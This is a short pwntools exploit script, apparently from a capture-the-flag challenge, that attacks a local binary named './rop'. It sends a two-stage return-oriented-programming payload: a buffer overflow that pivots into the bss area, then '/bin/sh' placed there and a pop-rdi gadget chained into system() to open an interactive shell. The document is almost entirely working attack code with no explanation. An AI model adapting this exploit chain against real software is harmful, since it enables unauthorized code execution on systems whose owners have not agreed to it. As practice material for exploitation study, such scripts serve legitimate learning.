from pwn import *
p = process('./rop')
e = ELF('./rop')
pop_rdi_ret = 0x4006e3
read_to = lambda x:x+0x10
area = e.bss()+0x800
call_system = 0x400655
to_get = 0x40061b

log.info('1st ROP')
print p.recv()

p.sendline(flat('A'*0x10, read_to(area), to_get, word_size=64))

print p.recv(), p.recv()
log.info('2nd ROP')

p.sendline(flat('/bin/sh\x00', 'B'*0x10, pop_rdi_ret, area, call_system, word_size=64))
print p.recv(), p.recv()
log.success('Spawm shell!')
p.interactive()
